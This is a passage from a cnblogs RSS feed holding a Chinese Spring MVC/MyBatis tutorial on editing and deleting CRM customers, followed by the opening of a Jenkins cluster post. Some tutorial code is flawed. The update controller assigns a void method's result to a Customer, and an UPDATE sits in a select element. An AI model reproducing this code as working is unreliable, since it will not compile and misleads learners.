&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String queryCustomerList(QueryVo queryVo, Model model) {

    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt; {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 解决get请求乱码问题&lt;/span&gt;
        &lt;span&gt;if&lt;/span&gt;&lt;span&gt; (StringUtils.isNotBlank(queryVo.getCustName())) {
            queryVo.setCustName(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt; String(queryVo.getCustName().getBytes(&quot;ISO-8859-1&quot;), &quot;UTF-8&quot;&lt;span&gt;));
        }
    } &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; (Exception e) {
        e.printStackTrace();
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户来源&lt;/span&gt;
    List&amp;lt;BaseDict&amp;gt; fromType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CUSTOMER_FROM_TYPE);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 所属行业&lt;/span&gt;
    List&amp;lt;BaseDict&amp;gt; industryType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CUSTOMER_INDUSTRY_TYPE);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 客户级别&lt;/span&gt;
    List&amp;lt;BaseDict&amp;gt; levelType = &lt;span&gt;this&lt;/span&gt;.baseDictService.queryBaseDictByDictTypeCode(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.CUSTOMER_LEVEL_TYPE);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把前端页面需要显示的数据放到模型中&lt;/span&gt;
    model.addAttribute(&quot;fromType&quot;&lt;span&gt;, fromType);
    model.addAttribute(&lt;/span&gt;&quot;industryType&quot;&lt;span&gt;, industryType);
    model.addAttribute(&lt;/span&gt;&quot;levelType&quot;&lt;span&gt;, levelType);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 分页查询数据&lt;/span&gt;
    Page&amp;lt;Customer&amp;gt; page = &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerService.queryCustomerByQueryVo(queryVo);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 把分页查询的结果放到模型中&lt;/span&gt;
    model.addAttribute(&quot;page&quot;&lt;span&gt;, page);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 数据回显&lt;/span&gt;
    model.addAttribute(&quot;custName&quot;&lt;span&gt;, queryVo.getCustName());
    model.addAttribute(&lt;/span&gt;&quot;custSource&quot;&lt;span&gt;, queryVo.getCustSource());
    model.addAttribute(&lt;/span&gt;&quot;custIndustry&quot;&lt;span&gt;, queryVo.getCustIndustry());
    model.addAttribute(&lt;/span&gt;&quot;custLevel&quot;&lt;span&gt;, queryVo.getCustLevel());

    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;customer&quot;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;h2&gt;7.1. &lt;strong&gt;需求&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;页面效果如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225121066-429490299.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;1、&lt;span&gt;客户列表中点击&lt;/span&gt;“修改”按钮弹出客户信息修改窗，并初始化客户信息&lt;/p&gt;
&lt;p&gt;2、&lt;span&gt;点击&lt;/span&gt;“保存修改”按钮将修改后的结果保存到数据库中&lt;/p&gt;




&lt;h2&gt;7.2. &lt;strong&gt;实现编辑数据回显&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;在客户列表显示中，可以点击修改按钮，弹出修改界面，打开浏览器的开发者工具，发现当点击修改按钮，会发起一个请求&lt;/p&gt;
&lt;p&gt;如下图方式进行查看&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225134604-1499686198.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225145742-1417422344.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;分析这里应该是发起请求到后台，获取该用户的详细信息，在页面上可以回显&lt;/p&gt;

&lt;p&gt;&lt;span&gt;复制请求路径中的&lt;/span&gt;edit.action&lt;span&gt;，在&lt;/span&gt;&lt;span&gt;customer.jsp&lt;/span&gt;&lt;span&gt;页面中搜索，找到请求逻辑&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;找到的代码如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225156493-504280199.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;发现这里是一个&lt;/span&gt;Ajax&lt;span&gt;请求，根据这个请求我们可以开发后台逻辑，提供给前端页面进行调用&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt;7.3. &lt;strong&gt;回显功能实现&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;7.3.1. &lt;strong&gt;Mapper&lt;/strong&gt;&lt;strong&gt;接口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerMapper&lt;span&gt;添加方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id查询客户
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
 &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
Customer queryCustomerById(Long id);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.3.2. &lt;strong&gt;Mapper.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerMapper.xml&lt;span&gt;编写&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 根据id查询用户 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;queryCustomerById&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.pojo.Customer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    SELECT * FROM customer WHERE cust_id = #{id}
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.3.3. &lt;strong&gt;Service&lt;span&gt;接口&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;编写&lt;/span&gt;CustomerService.&lt;span&gt;接口方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id查询数据
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
 &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
Customer queryCustomerById(Long id);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.3.4. &lt;strong&gt;Service&lt;span&gt;接口实现类&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerServiceImpl&lt;span&gt;实现接口方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Override
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Customer queryCustomerById(Long id) {
    Customer customer &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerMapper.queryCustomerById(id);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; customer;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;7.3.5. &lt;strong&gt;Controller&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerController&lt;span&gt;编写方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id查询用户,返回json格式数据
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
 &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@RequestMapping(&lt;/span&gt;&quot;edit&quot;&lt;span&gt;)
@ResponseBody
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Customer queryCustomerById(Long id) {
    Customer customer &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerService.queryCustomerById(id);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; customer;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;7.4. &lt;strong&gt;实现编辑客户数据&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;在编辑框，点击保存修改按钮，应该进行数据保存，如下图所示：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225429533-1375392787.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;发起请求如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225434351-149280406.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;在页面找到的请求逻辑是：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function updateCustomer() {
    $.post(&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;basePath&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;&lt;span&gt;customer/update.action&quot;,$(&quot;#edit_customer_form&quot;).serialize(),function(data){
        alert(&quot;客户信息更新成功！&quot;);
        window.location.reload();
    });
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;7.5. &lt;strong&gt;编辑功能实现&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;7.5.1. &lt;strong&gt;Mapper&lt;/strong&gt;&lt;strong&gt;接口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerMapper&lt;span&gt;添加方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id编辑客户
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; customer
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; updateCustomerById(Customer customer);
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.5.2. &lt;strong&gt;Mapper.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerMapper.xml&lt;span&gt;编写&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;46&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateCustomerById&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;cn.itcast.crm.pojo.Customer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    UPDATE `customer`
    SET
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_name !=null and cust_name != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_name` = #{cust_name},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_user_id !=null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_user_id` = #{cust_user_id},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_create_id !=null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_create_id` = #{cust_create_id},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_source !=null and cust_source != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_source` = #{cust_source},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_industry !=null and cust_industry != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_industry` = #{cust_industry},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_level !=null and cust_level != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_level` = #{cust_level},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_linkman !=null and cust_linkman != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_linkman` = #{cust_linkman},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_phone !=null and cust_phone != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_phone` = #{cust_phone},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_mobile !=null and cust_mobile != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_mobile` = #{cust_mobile},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_zipcode !=null and cust_zipcode != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_zipcode` = #{cust_zipcode},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;cust_address !=null and cust_address != ''&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        `cust_address` = #{cust_address},
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    `cust_createtime` = NOW()
    WHERE
    (`cust_id` = #{cust_id});
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.5.3. &lt;strong&gt;Service&lt;span&gt;接口&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;编写&lt;/span&gt;CustomerService.&lt;span&gt;接口方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id编辑客户数据
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; customer
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; updateCustomerById(Customer customer);
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.5.4. &lt;strong&gt;Service&lt;span&gt;接口实现类&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerServiceImpl&lt;span&gt;实现接口方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Override
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; updateCustomerById(Customer customer) {
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerMapper.updateCustomerById(customer);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;7.5.5. &lt;strong&gt;Controller&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerController&lt;span&gt;编写方法&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;需要正确的响应，要告诉前端更新成功。返回值有没有都可以。&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这里需要加&lt;/span&gt;@ResponseBody&lt;span&gt;注解，使其不走视图解析器。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id查询用户,返回更新后客户的json格式数据
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
 &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@RequestMapping(&lt;/span&gt;&quot;update&quot;&lt;span&gt;)
@ResponseBody
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String updateCustomerById(Customer customer) {
    Customer result &lt;/span&gt;= &lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerService.updateCustomerById(customer);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;OK&quot;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;



&lt;h2&gt;8.1. &lt;strong&gt;需求分析&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;span&gt;点击客户列表中的删除按钮，提示&lt;/span&gt;“警告信息”，如下图&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225647996-1863492468.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;如下图，点击确定后删除用户信息，并刷新页面。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225654275-1436158936.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;



&lt;p&gt;发起的请求如下图：&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://images2018.cnblogs.com/blog/1135185/201807/1135185-20180711225659226-1832555067.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;


&lt;p&gt;&lt;span&gt;搜索前端&lt;/span&gt;jsp&lt;span&gt;页面逻辑找到如下代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;function deleteCustomer(id) {
    if(confirm('确实要删除该客户吗?')) {
        $.post(&quot;&lt;/span&gt;&lt;span&gt;&amp;lt;%&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;basePath&lt;/span&gt;&lt;span&gt;%&amp;gt;&lt;/span&gt;&lt;span&gt;customer/delete.action&quot;,{&quot;id&quot;:id},function(data){
            alert(&quot;客户删除更新成功！&quot;);
            window.location.reload();
        });
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;8.2. &lt;strong&gt;功能&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;开发&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;8.2.1. &lt;strong&gt;Mapper&lt;/strong&gt;&lt;strong&gt;接口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerMapper&lt;span&gt;添加方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id删除用户
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; deleteCustomerById(Long id);
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;8.2.2. &lt;strong&gt;Mapper.xml&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerMapper.xml&lt;span&gt;编写&lt;/span&gt;&lt;span&gt;sql&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 根据id删除客户 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteCustomerById&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;long&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    DELETE FROM
    customer WHERE cust_id = #{id}
&lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h3&gt;8.2.3. &lt;strong&gt;S&lt;/strong&gt;&lt;strong&gt;ervice&lt;/strong&gt;&lt;strong&gt;接口&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerService&lt;span&gt;编写接口方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 根据id删除客户
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;void&lt;/span&gt; deleteCustomerById(Long id);
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;8.2.4. &lt;strong&gt;Service&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;实现类&lt;/span&gt;&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerServiceImpl&lt;span&gt;实现接口方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@Override
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; deleteCustomerById(Long id) {
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerMapper.deleteCustomerById(id);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;8.2.5. &lt;strong&gt;Controller&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;在&lt;/span&gt;CustomerController&lt;span&gt;编写方法&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * 删除用户
 * 
 * &lt;/span&gt;&lt;span&gt;@param&lt;/span&gt;&lt;span&gt; id
 * &lt;/span&gt;&lt;span&gt;@return&lt;/span&gt;
 &lt;span&gt;*/&lt;/span&gt;&lt;span&gt;
@RequestMapping(&lt;/span&gt;&quot;delete&quot;&lt;span&gt;)
@ResponseBody
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String deleteCustomerById(Long id) {
    &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;&lt;span&gt;.customerService.deleteCustomerById(id);
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &quot;ok&quot;&lt;span&gt;;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Wed, 11 Jul 2018 15:22:00 +0000</pubDate>
<dc:creator>kent鹏</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xieyupeng/p/9297264.html</dc:identifier>
</item>
<item>
<title>Jenkins 集群搭建 - 晓晨Master</title>
<link>http://www.cnblogs.com/stulzq/p/9297260.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/stulzq/p/9297260.html</guid>
<description>&lt;h2 id=&quot;一.前言&quot;&gt;一.前言&lt;/h2&gt;
&lt;p&gt;Jenkins是当下比较流行的一款功能强大的持续集成工具，它支持搭建集群，来提高多项目的构建速度，模式为主从模式，master会将任务分配到各个从节点进行并发构建，从而提高速度，下面介绍一下如何搭建Jenkins集群。&lt;/p&gt;
&lt;h2 id=&quot;二.环境介绍&quot;&gt;二.环境介绍&lt;/h2&gt;
&lt;p&gt;系统环境：CentOS 7.2&lt;/p&gt;
&lt;p&gt;Jenkins版本：2.121.1 长期支持版&lt;/p&gt;
&lt;p&gt;两台服务器,一台作为master，一台作为slave，设A为master，设B为slave。&lt;/p&gt;
